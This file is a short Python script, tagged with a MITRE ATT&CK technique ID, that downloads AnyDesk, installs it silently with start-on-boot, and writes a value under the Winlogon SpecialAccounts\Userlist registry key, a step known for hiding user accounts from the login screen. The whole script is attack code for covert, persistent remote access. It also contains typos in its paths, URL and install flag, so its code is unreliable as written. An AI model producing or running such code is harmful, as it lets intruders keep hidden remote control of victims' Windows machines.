'''
T1059.001 Command and Scripting Interpreter
'''

import requests
from pathlib import Path 
import shutil
import winreg
import os 

hive = winreg.HKEY_LOCAL_MACHINE
subkey = r'Software\\Microsoft\\Windows NT\\CurrentVersion\Winlogon\SpecialAccounts\\Userlist'
path = "C:/ProgrmaData/AnyDesk.exe"
name = "test"
value = 123

#download anydesk
url = "https://downaload.anydesk.com/AnyDesk.exe"

response = requests.get(url, stream = True)
if response.status_code == 200:
    print("Connection Successful")
else:
    print(f"Connection Failed. Status Code: {response.status_code}")

with open (path , 'wb') as file:
    shutil.copyfileobj(response.raw, file)
print(f"Download Successful. PathL {path}")

#silent install of anydesk
command = r'C:\\ProgramData\Anydesk.exe --instal "C:\\ProgramData\Anydesk" --start-with-win --silent'
result = os.system(command)
if result == 0:
    print("Anydesk Install Succesful")
    #update reg key 
    key = winreg.CreateKey(hive, subkey)
    print(f"{subkey} Opened Successfully")
    winreg.SetValueEx(key, name, 0, winreg.REG_DWORD, value)
    key_value = winreg.QueryValueEx(key, name)
    print(f"The Value for {key} is {key_value[0]}")
else:
    print("Anydesk Install Failed")